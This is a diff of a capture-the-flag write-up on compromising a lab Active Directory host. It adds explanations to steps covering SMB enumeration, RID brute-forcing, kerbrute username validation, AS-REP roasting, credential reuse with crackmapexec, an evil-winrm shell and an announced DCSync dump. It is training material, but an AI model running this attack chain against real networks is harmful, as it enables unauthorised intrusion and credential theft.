@@ -6,7 +6,7 @@
 
 ***
 
-First Let's use The nmap .
+First , Let's use The `nmap` scan  to check the which services is running  .
 
 ```
 sudo nmap -sV -sC -Pn 10.48.133.159 -T4
@@ -14,7 +14,7 @@ sudo nmap -sV -sC -Pn 10.48.133.159 -T4
 
 <figure><img src="../.gitbook/assets/image (902).png" alt=""><figcaption></figcaption></figure>
 
-List The SMB services .
+We can see on the above image we got the smb port open `139,445` let's List The SMB services .
 
 ```
 smbclient -L //10.48.133.159/ -N
@@ -22,7 +22,7 @@ smbclient -L //10.48.133.159/ -N
 
 <figure><img src="../.gitbook/assets/image (903).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+Then check the content on the inside the services !
 
 ```
 smbclient //10.48.133.159/VulnNet-Business-Anonymous -N
@@ -38,11 +38,11 @@ smbclient //10.48.133.159/VulnNet-Enterprise-Anonymous -N
 
 <figure><img src="../.gitbook/assets/image (905).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+Then Collect the all names from the all files .
 
 <figure><img src="../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>
 
-Username Enumeration
+Then we use the Username Enumeration tools to make the all types of possible usernames .
 
 [https://github.com/urbanadventurer/username-anarchy.git](https://github.com/urbanadventurer/username-anarchy.git)
 
@@ -50,7 +50,7 @@ Username Enumeration
 username-anarchy --input-file users.txt > usernames.txt
 ```
 
-Test
+Check for the all rid values and also paste these username inside the `usernames.txt` file !
 
 ```
 nxc smb 10.48.181.145 -u 'guest' -p '' --rid-brute
@@ -58,7 +58,7 @@ nxc smb 10.48.181.145 -u 'guest' -p '' --rid-brute
 
 <figure><img src="../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+Then i use the kerbrute tool for the validate the usernames and we got the hash that means Kerberos pre-authentication is disabled and we can attack the AS-REP Roasting !
 
 ```
 kerbrute userenum -d vulnnet-rst.local --dc 10.48.181.145 usernames.txt
@@ -66,7 +66,7 @@ kerbrute userenum -d vulnnet-rst.local --dc 10.48.181.145 usernames.txt
 
 <figure><img src="../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+AS-REP Roasting attacking for the `usernames.txt` file  !
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
@@ -80,7 +80,7 @@ Let,s Crack The Hash !
 
 <figure><img src="../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>
 
-TEST
+Use The credential of t-skid and list the services !
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
@@ -94,7 +94,7 @@ Check The Password in The `ResetPassword.vbs` !
 
 <figure><img src="../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>
 
-Check The Credential !
+Then we Check The Credential and we got the `Pwn3d!` its mean this account is a local admin account  !
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
@@ -103,6 +103,18 @@ crackmapexec smb 10.48.134.46 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
 {% endcode %}
 
 <figure><img src="../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>
+
+Then we use the evil-winrm to get the shell !
+
+{% code overflow="wrap" lineNumbers="true" expandable="true" %}
+```
+evil-winrm -i 10.48.145.35 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>
+
+Then we use the local admin credential to perform the DCSync attack / Active Directory credential dumping !
 
 {% code overflow="wrap" lineNumbers="true" expandable="true" %}
 ```
